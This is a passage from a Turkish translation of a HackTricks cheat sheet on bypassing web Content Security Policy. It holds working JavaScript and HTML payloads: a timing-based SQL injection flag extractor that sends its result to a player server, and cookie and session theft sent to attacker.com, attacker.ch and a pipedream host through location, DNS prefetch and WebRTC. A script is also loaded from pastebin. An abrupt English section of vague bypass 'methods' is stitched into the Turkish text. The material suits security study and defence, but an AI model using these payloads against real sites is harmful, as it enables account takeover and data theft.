script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Bu direktif, **mevcut script-src direktiflerini üzerine yazar**.\
Bir örnek burada bulunabilir: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

Edge'de çok daha basittir. Eğer CSP'ye sadece bunu ekleyebilirseniz: **`;_`** **Edge**, **tüm politikayı düşürecektir**.\
Örnek: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; XSS aracılığıyla (iframe) - Zaman saldırısı

'unsafe-inline' direktifinin eksik olduğuna dikkat edin\
Bu sefer kurbanı, bir `<iframe` aracılığıyla **kontrolünüzdeki** bir sayfayı **yüklemesini sağlayabilirsiniz**. Bu sefer kurbanı istediğiniz yerden bilgi çıkarmaya (**CSRF**) zorlayacaksınız. Sayfanın içeriğine erişemezsiniz, ancak sayfanın yüklenmesi için gereken süreyi bir şekilde **kontrol edebilirseniz**, ihtiyacınız olan bilgileri çıkarabilirsiniz.

Bu sefer bir **bayrak** çıkarılacak, bir **karakter doğru tahmin edildiğinde** SQLi aracılığıyla **yanıtın** sleep fonksiyonundan dolayı **daha uzun sürmesi** nedeniyle bayrağı çıkarabileceksiniz:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### Yer İşaretçileri Aracılığıyla

Bu saldırı, saldırganın kullanıcıyı ikna ederek bir bağlantıyı tarayıcının yer işaretçisi üzerine sürükleyip bırakmasını sağlamayı içerir. Bu yer işaretçisi, sürüklendiğinde veya tıklandığında mevcut web penceresinin bağlamında **kötü amaçlı javascript** kodunu içerecektir, **CSP'yi atlayarak çerezler veya tokenlar gibi hassas bilgileri çalmaya izin verir**.

Daha fazla bilgi için [**orijinal raporu buradan kontrol edin**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### CSP kısıtlayarak CSP'nin atlatılması

Bu [**CTF çözümünde**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), bir izin verilen iframe içine daha kısıtlayıcı bir CSP enjekte edilerek CSP atlatılmış ve belirli bir JS dosyasının yüklenmesine izin verilmedi, ardından **prototype kirliliği** veya **dom clobbering** aracılığıyla farklı bir betiğin keyfi bir betik yüklemesine izin verildi.

Bir Iframe'in CSP'sini **`csp`** özniteliği ile **kısıtlayabilirsiniz**:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

[**Bu CTF çözümünde**](https://github.com/aszx87410/ctf-writeups/issues/48), **HTML enjeksiyonu** aracılığıyla **CSP** daha fazla **kısıtlanabilir** ve böylece CSTI'yi önleyen bir betik devre dışı bırakılabilir ve dolayısıyla **zafiyet sömürülebilir hale geldi.**\
CSP daha kısıtlayıcı hale getirilebilir **HTML meta etiketleri** kullanılarak ve iç içe betikler **girişi kaldırılarak** devre dışı bırakılabilir ve **nonce**'larına izin verilir ve **sha** aracılığıyla belirli iç içe betikler etkinleştirilebilir:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### İçerik-Güvenlik-Politikası-Rapor-Yalnızca ile JS veri sızdırma

Eğer sunucunun yanıt vermesini sağlayabilirseniz **`Content-Security-Policy-Report-Only`** başlığıyla ve bir **siz tarafından kontrol edilen değerle** (belki bir CRLF nedeniyle), sunucunuzu işaret etmesini sağlayabilir ve eğer istediğiniz JS içeriğini **`<script>`** ile sarmalarsanız ve muhtemelen `unsafe-inline`'ın CSP tarafından izin verilmediği için bu, bir CSP hatası tetikleyecek ve hassas bilgileri içeren betiğin bir kısmı `Content-Security-Policy-Report-Only` aracılığıyla sunucuya gönderilecektir.

Örnek için [**bu CTF çözümüne bakın**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### CSP ve Iframe ile Bilgi Sızdırma

* İzin verilen bir CSP'ye sahip URL'ye işaret eden bir `iframe` oluşturulur (bunu `https://example.redirect.com` olarak adlandıralım).
* Bu URL daha sonra, CSP tarafından **izin verilmeyen** gizli bir URL'ye yönlendirir (örneğin, `https://usersecret.example2.com`).
* `securitypolicyviolation` etkinliğini dinleyerek, `blockedURI` özelliğini yakalayarak, engellenen URI'nin alan adını ifşa edebilirsiniz ve böylece başlangıçtaki URL'nin yönlendiği gizli alan adını sızdırabilirsiniz.

İlginç bir not olarak, Chrome ve Firefox gibi tarayıcıların CSP'ye ilişkin iframe'leri işleme konusunda farklı davranışları vardır, bu da tanımsız davranış nedeniyle hassas bilgilerin sızmasına neden olabilir.

Başka bir teknik, CSP'yi kendisi üzerinden kullanarak gizli alt alan adını çıkarmayı içerir. Bu yöntem, bir ikili arama algoritmasına dayanır ve CSP'yi belirli alanları kasıtlı olarak engelleyen veya izin veren alanları içerecek şekilde ayarlamayı içerir. Örneğin, gizli alt alan adı bilinmeyen karakterlerden oluşuyorsa, CSP yönergesini değiştirerek bu alt alan adlarını engelleyen veya izin veren şekilde ayarlayarak farklı alt alan adlarını iteratif olarak test edebilirsiniz. Aşağıdaki kod parçası, bu yöntemi kolaylaştırmak için CSP'nin nasıl yapılandırılabileceğini göstermektedir:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
CSP tarafından engellenen veya izin verilen istekleri izleyerek, gizli alt alanındaki olası karakterleri daraltarak sonunda tam URL'yi ortaya çıkarabilirsiniz.

Her iki yöntem de CSP uygulamasının inceliklerinden ve tarayıcılardaki davranışından yararlanır, görünüşte güvenli politikaların hassas bilgileri yanlışlıkla sızdırabileceğini gösterir.

Hile [**buradan**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve ödül avcılarıyla iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hacking İçgörüleri**\
Hacking'in heyecanına ve zorluklarına inen içeriklerle etkileşime girin

**Gerçek Zamanlı Hack Haberleri**\
Hızlı tempolu hacking dünyasını gerçek zamanlı haberler ve içgörülerle takip edin

**En Son Duyurular**\
Yeni ödül avcılarının başlatılmasını ve önemli platform güncellemelerini takip edin

**Bize** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **katılın ve bugün en iyi hackerlarla işbirliğine başlayın!**

## CSP'yi Atlatmak İçin Güvensiz Teknolojiler

### PHP yanıt tamponu aşırı yükleme

PHP'nin varsayılan olarak yanıtı 4096 bayte kadar tamponladığı bilinmektedir. Bu nedenle, PHP bir uyarı gösteriyorsa, yeterli veri sağlayarak uyarıların içine yeterli veri sağlayarak yanıtın CSP başlığından önce gönderilmesine neden olur.\
Sonra, tekniğin temeli temelde yanıt tamponunu uyarılarla doldurmaktır, böylece CSP başlığı gönderilmez.

Fikir [**bu yazıdan**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Hata Sayfasını Yeniden Yazma

[**Bu yazıdan**](https://blog.ssrf.kr/69) görünüşe göre bir CSP korumasını atlatmanın mümkün olduğu, bir hata sayfası yükleyerek (muhtemelen CSP olmadan) ve içeriğini yeniden yazarak mümkün olduğu görünüyor.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME, bir sayfanın bir uç noktasındaki XSS'i (veya çok sınırlı XSS'i) **istismar eden** ve ardından **aynı kökenin diğer uç noktalarını istismar etmek** için kullanılan bir tekniktir. Bu, savunmasız uç noktayı bir saldırgan sayfasından yükleyerek ve ardından saldırgan sayfasını istismar etmek istediğiniz aynı kökenden gerçek uç noktaya yeniden yükleyerek yapılır. Bu şekilde **savunmasız uç nokta**, **payload** içinde **`opener`** nesnesini kullanarak **istismar edilecek gerçek uç noktanın DOM'una erişebilir**. Daha fazla bilgi için şuraya bakın:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Ayrıca, **wordpress**'in `/wp-json/wp/v2/users/1?_jsonp=data` yolunda **verileri** yansıtacak bir **JSONP** uç noktası bulunmaktadır (yalnızca harfler, rakamlar ve noktalarla sınırlıdır).

Bir saldırgan, bu uç noktayı **WordPress'e karşı bir SOME saldırısı oluşturmak** ve `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` içine **yerleştirmek** için kullanabilir. Bu **script**, 'self' tarafından **izin verildiği için yüklenecektir**. Ayrıca, ve çünkü WordPress yüklü olduğundan, bir saldırgan **SOME saldırısını** **CSP'yi atlayan** **savunmasız** **geri çağrı** uç noktası aracılığıyla kullanarak bir kullanıcıya daha fazla ayrıcalık vermek, yeni bir eklenti yüklemek gibi işlemleri istismar edebilir...\
Bu saldırıyı nasıl gerçekleştireceğiniz hakkında daha fazla bilgi için [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Veri Sızdırma Atlatmaları

Eğer **harici sunucularla etkileşime izin vermeyen** sıkı bir CSP varsa, bilgileri sızdırmak için her zaman yapabileceğiniz bazı şeyler vardır.

### Konum

Sadece konumu güncelleyerek gizli bilgileri saldırganın sunucusuna gönderebilirsiniz:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Meta etiketi

Bir meta etiketi enjekte ederek yönlendirebilirsiniz (bu sadece bir yönlendirme işlemidir, içerik sızdırmayacaktır)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Ön Yükleme

Sayfaları daha hızlı yüklemek için tarayıcılar, ana bilgisayar adlarını IP adreslerine önceden çözümleyip daha sonra kullanmak üzere önbelleğe alırlar.\
Tarayıcıya bir ana bilgisayar adını önceden çözümlemesi için şu şekilde belirtebilirsiniz: `<link rel="dns-prefetch" href="something.com">`

Bu davranışı istismar ederek **DNS istekleri aracılığıyla hassas bilgileri dışarı sızdırabilirsiniz**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
## CSP Bypass Techniques

### Method 1: Using Untrusted Directives

When a Content Security Policy (CSP) is implemented with untrusted directives like `unsafe-inline` or `unsafe-eval`, an attacker can bypass the policy by injecting malicious code using these directives.

### Method 2: Data Exfiltration via Form Actions

An attacker can bypass CSP by exfiltrating data through form actions. By submitting a form with sensitive data to a controlled endpoint, the attacker can leak information despite the CSP restrictions.

### Method 3: Using Trusted Sources

If a CSP allows loading scripts from trusted sources, an attacker can host malicious code on these trusted sources to bypass the policy and execute arbitrary code on the target website.

### Method 4: Exploiting Browser Extensions

By exploiting vulnerabilities in browser extensions that are allowed by the CSP, an attacker can inject and execute malicious code on the target website, bypassing the CSP restrictions.
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Bu durumun yaşanmasını engellemek için sunucu HTTP başlığını gönderebilir:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
Görünüşe göre, bu teknik başsız tarayıcılarda (botlar) çalışmıyor.
{% endhint %}

### WebRTC

Birkaç sayfada **WebRTC'nin CSP'nin `connect-src` politikasını kontrol etmediğini** okuyabilirsiniz.

Aslında, bir _DNS isteği_ kullanarak bilgi sızdırabilirsiniz. Bu kodu inceleyin:
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
Başka bir seçenek:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## Çevrimiçi CSP Politikalarını Kontrol Etme

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Otomatik Olarak CSP Oluşturma

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Referanslar

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)

​

<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın, deneyimli hackerlar ve hata avcıları ile iletişim kurun!

**Hacking Insights**\
Hacking'in heyecanını ve zorluklarını ele alan içeriklerle etkileşime girin

**Gerçek Zamanlı Hack Haberleri**\
Hızlı tempolu hacking dünyasını gerçek zamanlı haberler ve içgörülerle takip edin

**En Son Duyurular**\
Yeni hata avcılıklarını ve önemli platform güncellemelerini takip edin

**Bize Katılın** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugün en iyi hackerlarla işbirliğine başlayın!

<details>

<summary><strong>Sıfırdan Kahraman'a AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'ı PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya** Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'u takip edin.**
* **Hacking hilelerinizi paylaşarak HackTricks ve HackTricks Cloud** github depolarına PR'lar göndererek destekleyin.

</details>
